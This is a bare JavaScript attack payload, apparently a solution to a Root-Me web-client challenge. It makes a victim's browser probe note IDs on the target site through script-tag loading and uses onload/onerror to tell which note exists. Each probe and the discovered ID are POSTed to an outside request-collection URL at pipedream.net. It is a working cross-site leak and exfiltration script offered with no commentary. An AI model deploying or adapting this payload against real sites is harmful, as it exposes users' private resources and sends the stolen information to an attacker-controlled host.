<script>
function sendRequest(url) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
    xhr.send(url);
}

var idFound = false;
    
async function attack() {
    sendRequest("test=true");
    let i = 0;
    while (!idFound && i < 5000) {
        try {
            await new Promise((resolve, reject) => {
                var script = document.createElement('script');
                script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`;
                document.body.appendChild(script);
                
                script.onload = () => {
                    idFound = true;
                    sendRequest(`id=${i}`);
                    resolve();
                }
                script.onerror = reject;
                sendRequest("test="+i);
            })
            
        } catch (error) {
            i++;
            continue;
        }
    }      
}
attack();
</script>
